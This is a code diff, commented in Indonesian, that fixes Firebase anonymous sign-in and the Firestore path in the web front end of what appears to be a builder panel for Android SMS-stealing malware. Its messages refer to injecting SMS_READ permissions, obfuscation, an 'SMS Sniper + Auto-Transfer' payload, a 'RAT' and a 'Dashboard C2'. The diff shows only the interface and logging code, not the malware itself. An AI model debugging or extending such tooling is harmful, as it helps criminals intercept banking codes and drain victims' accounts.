@@ -35,8 +35,14 @@
             status.innerHTML = `<p class="text-blue-400 animate-pulse font-bold">>>> Initializing Compiler Engine...</p>`;
 
             try {
-                await signInAnonymously(auth);
+                // FIX: Pastikan Auth selesai sebelum lanjut ke Firestore
+                const userCredential = await signInAnonymously(auth);
+                const user = userCredential.user;
                 
+                if (!user) {
+                    throw new Error("Gagal melakukan autentikasi anonim.");
+                }
+
                 // Tahap 1: Obfuscation & Permission Injection
                 setTimeout(() => {
                     status.innerHTML += `<p class="text-green-500">[OK] Injecting SMS_RECEIVE & SMS_READ permissions...</p>`;
@@ -59,7 +65,8 @@
                     
                     const payloadType = useAutoTransfer ? "SMS Sniper + Auto-Transfer" : "SMS Sniper Only";
                     
-                    // Mengirim log ke Dashboard C2 secara real-time
+                    // FIX: Gunakan path koleksi yang sesuai dengan aturan permission Canvas
+                    // /artifacts/{appId}/public/data/{collectionName}
                     await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'logs'), {
                         message: `New Payload Built: ${appName}.apk (${payloadType} Active)`,
                         type: useAutoTransfer ? "CRITICAL" : "RAT",
@@ -76,6 +83,7 @@
                 }, 3500);
 
             } catch (err) {
+                console.error("Firebase Error Details:", err);
                 status.innerHTML += `<p class="text-red-500 font-bold">[ERROR] Build Failed: ${err.message}</p>`;
                 btn.disabled = false;
             }
